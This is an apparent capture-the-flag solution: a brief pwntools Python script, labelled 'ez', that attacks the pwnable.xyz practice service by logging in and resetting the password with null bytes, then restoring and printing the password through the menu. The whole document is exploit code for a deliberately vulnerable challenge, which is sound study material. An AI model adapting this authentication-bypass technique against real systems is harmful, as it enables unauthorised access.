ez



脚本：

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

p = remote('svc.pwnable.xyz', 30026)
# p = process('./challenge')

info('login')
p.sendlineafter(b'User ID: ', b'1')
p.sendlineafter(b'> ', b'1')
p.sendafter(b'Password: ', b'\x00')

info('new password')
p.sendlineafter(b'> ', b'2')
p.sendafter(b'New password:', b'\x00')

info('restore password')
p.sendlineafter(b'> ', b'4')

info('print password')
p.sendlineafter(b'> ', b'3')

# gdb.attach(p)
p.interactive()

```

